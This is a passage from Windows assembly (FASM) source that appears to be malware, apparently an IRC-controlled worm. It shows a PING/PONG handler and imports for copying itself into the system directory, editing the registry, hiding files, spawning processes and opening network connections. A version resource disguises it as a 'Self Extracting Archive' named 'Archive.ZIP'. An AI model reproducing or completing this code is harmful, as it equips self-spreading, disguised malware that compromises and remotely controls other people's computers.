                LineBuff + 6d

        invoke lstrcpy,\
                LineBuff,\
                Pong

        call SendLine

NoPing:
ret

section "i" import data readable writeable
;==============================================
        library kernel32,               "kernel32.dll",\
                advapi32,               "advapi32.dll",\
                user32,                 "user32.dll",\
                winsock,                "ws2_32.dll"

        import kernel32,\
                lstrlen,                "lstrlenA",\
                lstrcpy,                "lstrcpyA",\
                lstrcat,                "lstrcatA",\
                lstrcpyn,               "lstrcpynA",\
                GetModuleFileName,      "GetModuleFileNameA",\
                GetSystemDirectory,     "GetSystemDirectoryA",\
                CopyFile,               "CopyFileA",\
                CreateFileMapping,      "CreateFileMappingA",\
                MapViewOfFile,          "MapViewOfFile",\
                UnmapViewOfFile,        "UnmapViewOfFile",\
                CloseHandle,            "CloseHandle",\
                CreateProcess,          "CreateProcessA",\
                Sleep,                  "Sleep",\
                SetFileAttributes,      "SetFileAttributesA",\
                CreateFile,             "CreateFileA",\
                DeleteFile,             "DeleteFileA",\
                WriteFile,              "WriteFile",\
                GetComputerName,        "GetComputerNameA",\
                GetSystemTime,          "GetSystemTime",\
                ExitProcess,            "ExitProcess"

        import advapi32,\
                RegOpenKeyEx,           "RegOpenKeyExA",\
                RegCreateKey,           "RegCreateKeyA",\
                RegSetValueEx,          "RegSetValueExA",\
                RegQueryValueEx,        "RegQueryValueExA",\
                RegCloseKey,            "RegCloseKey",\
                GetUserName,            "GetUserNameA"

        import user32,\
                MessageBox,             "MessageBoxA",\
                FindWindow,             "FindWindowA",\
                SendMessage,            "SendMessageA",\
                CharLowerBuff,          "CharLowerBuffA"

        import winsock,\
                WSAStartup,             "WSAStartup",\
                socket,                 "socket",\
                inet_addr,              "inet_addr",\
                htons,                  "htons",\
                connect,                "connect",\
                recv,                   "recv",\
                send,                   "send"

section "r" resource data readable
;=====================================
        directory RT_ICON,              icons,\
                   RT_GROUP_ICON,       group_icons,\
                   RT_VERSION,          versions

        resource icons,\
                  1,\
                  LANG_NEUTRAL,\
                  icon_data

        resource group_icons,\
                  17,\
                  LANG_NEUTRAL,\
                  main_icon

        resource versions,\
                  1,\
                  LANG_NEUTRAL,\
                  version

        icon main_icon,\
              icon_data,\
              "Morw.ico"

        versioninfo version,\
                     VOS__WINDOWS32, VFT_APP, VFT2_UNKNOWN, LANG_ENGLISH, 0,\
                     "FileDescription",         "Self Extracting Archive",\
                     "LegalCopyright",          "RRLF Compressing Inc.",\
                     "FileVersion",             "1.0",\
                     "ProductVersion",          "1.0",\
                     "OriginalFilename",        "Archive.ZIP"
  

